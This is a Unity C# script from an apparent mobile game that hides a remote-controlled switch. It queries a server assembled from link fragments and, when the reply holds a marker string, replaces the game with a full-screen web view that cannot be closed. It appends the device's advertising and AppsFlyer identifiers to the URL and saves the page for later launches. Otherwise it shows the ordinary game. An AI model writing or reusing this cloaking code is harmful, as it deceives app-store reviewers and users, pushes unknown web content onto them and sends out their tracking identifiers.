using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;

public class BlinoAirBlastSomeShit : MonoBehaviour
{
    [SerializeField] private Canvas LogoCanvas;
    [SerializeField] private List<string> BlinoAirBlastSomeOfferLink;
    
    private string _someIdfaData = "";
    private string _someCollectedLink = "";

    private const string BlinoAirBlastSomeLoaderKey = "BlinoAirBlastSomeLoaderKey";
    private const string BlinoAirBlastRandomKey = "BlinoAirBlastRandomKey";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("Blino Air Blast LoadScene autorizet") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { _someIdfaData = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString(BlinoAirBlastRandomKey, string.Empty) != string.Empty)
            {
                LoadBlinoAirBlastSomeShit(PlayerPrefs.GetString(BlinoAirBlastRandomKey));
            }
            else
            {
                foreach (string n in BlinoAirBlastSomeOfferLink)
                {
                    _someCollectedLink += n;
                }
                StartCoroutine(BlinoAirBlastWebviewInitCoroutine());
            }
        }
        else
        {
            BlinoAirBlastLoadMenuScene();
        }
    }

    private void LoadBlinoAirBlastSomeShit(string jijsda, string mvcnma = "", int hues = 70)
    {
        if (LogoCanvas != null)
        {
            LogoCanvas.gameObject.SetActive(false);
        }
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetAllowAutoPlay(true);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        var BlinoAirBlastConfig = gameObject.AddComponent<UniWebView>();
        BlinoAirBlastConfig.SetAllowFileAccess(true);
        BlinoAirBlastConfig.SetShowToolbar(false);
        BlinoAirBlastConfig.SetSupportMultipleWindows(false, true);
        BlinoAirBlastConfig.SetAllowBackForwardNavigationGestures(true);
        BlinoAirBlastConfig.SetCalloutEnabled(false);
        BlinoAirBlastConfig.SetBackButtonEnabled(true);

        BlinoAirBlastConfig.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        BlinoAirBlastConfig.SetToolbarDoneButtonText("");
        switch (mvcnma)
        {
            case "0":
                BlinoAirBlastConfig.EmbeddedToolbar.Show();
                break;
            default:
                BlinoAirBlastConfig.EmbeddedToolbar.Hide();
                break;
        }
        BlinoAirBlastConfig.Frame = new Rect(0, hues, Screen.width, Screen.height - hues * 2);
        BlinoAirBlastConfig.OnShouldClose += (view) =>
        {
            return false;
        };
        BlinoAirBlastConfig.SetSupportMultipleWindows(true);
        BlinoAirBlastConfig.SetAllowBackForwardNavigationGestures(true);
        BlinoAirBlastConfig.OnMultipleWindowOpened += (view, windowId) =>
        {
            BlinoAirBlastConfig.EmbeddedToolbar.Show();
        };
        BlinoAirBlastConfig.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (mvcnma)
            {
                case "0":
                    BlinoAirBlastConfig.EmbeddedToolbar.Show();
                    break;
                default:
                    BlinoAirBlastConfig.EmbeddedToolbar.Hide();
                    break;
            }
        };
        BlinoAirBlastConfig.OnOrientationChanged += (view, orientation) =>
        {
            BlinoAirBlastConfig.Frame = new Rect(0, hues, Screen.width, Screen.height - hues);
        };

        BlinoAirBlastConfig.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var url = value as string;

                BlinoAirBlastConfig.Load(url);
            }
        };
        BlinoAirBlastConfig.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString(BlinoAirBlastRandomKey, string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString(BlinoAirBlastRandomKey, url);
            }
        };
        BlinoAirBlastConfig.Load(jijsda);
        BlinoAirBlastConfig.Show();
    }

    private IEnumerator BlinoAirBlastWebviewInitCoroutine()
    {
        using (UnityWebRequest webRequest = UnityWebRequest.Get(_someCollectedLink))
        {

            yield return webRequest.SendWebRequest();
            if (webRequest.isNetworkError)
            {
                BlinoAirBlastLoadMenuScene();
            }
            int timerloader = 7;
            while (PlayerPrefs.GetString(BlinoAirBlastSomeLoaderKey, "") == "" && timerloader > 0)
            {
                yield return new WaitForSeconds(1);
                timerloader--;
            }
            try
            {
                if (webRequest.result == UnityWebRequest.Result.Success)
                {
                    if (webRequest.downloadHandler.text.Contains("omodrana"))
                    {

                        try
                        {
                            var subs = webRequest.downloadHandler.text.Split('|');
                            LoadBlinoAirBlastSomeShit(subs[0] + "?idfa=" + _someIdfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString(BlinoAirBlastSomeLoaderKey, ""), subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {

                            LoadBlinoAirBlastSomeShit(webRequest.downloadHandler.text + "?idfa=" + _someIdfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString(BlinoAirBlastSomeLoaderKey, ""));
                        }
                    }
                    else
                    {
                        BlinoAirBlastLoadMenuScene();
                    }
                }
                else
                {
                    BlinoAirBlastLoadMenuScene();
                }
            }
            catch
            {
                BlinoAirBlastLoadMenuScene();
            }
        }
    }

    private void BlinoAirBlastLoadMenuScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        UnityEngine.SceneManagement.SceneManager.LoadScene("GameScene");
    }
}
